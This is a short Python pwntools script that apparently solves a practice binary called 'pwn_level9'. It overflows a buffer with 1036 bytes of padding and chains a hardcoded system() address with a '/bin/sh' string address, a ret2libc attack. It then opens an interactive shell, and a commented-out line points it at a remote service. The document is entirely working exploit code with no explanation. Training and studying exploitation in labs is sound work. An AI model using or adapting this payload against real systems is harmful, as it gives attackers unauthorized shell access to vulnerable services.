#!/usr/bin/env python

from pwn import *

def main():

    offset = 1036
    system = p32(0xf7e193d0)
    random_addr = p32(0xAAAAAAAA)
    #bin_sh = p32(0xffffd660) # bash
    bin_sh = p32(0xf7f56f68) # /bin/sh
    payload = cyclic(offset) + system + random_addr + bin_sh

    #conn = remote('linux-pwn', 10009)
    conn = process('./pwn_level9')
    #gdb.attach(conn)
    print conn.recvuntil('name?')
    conn.sendline(payload)
    conn.recv()
    conn.interactive()
    conn.close()

main()
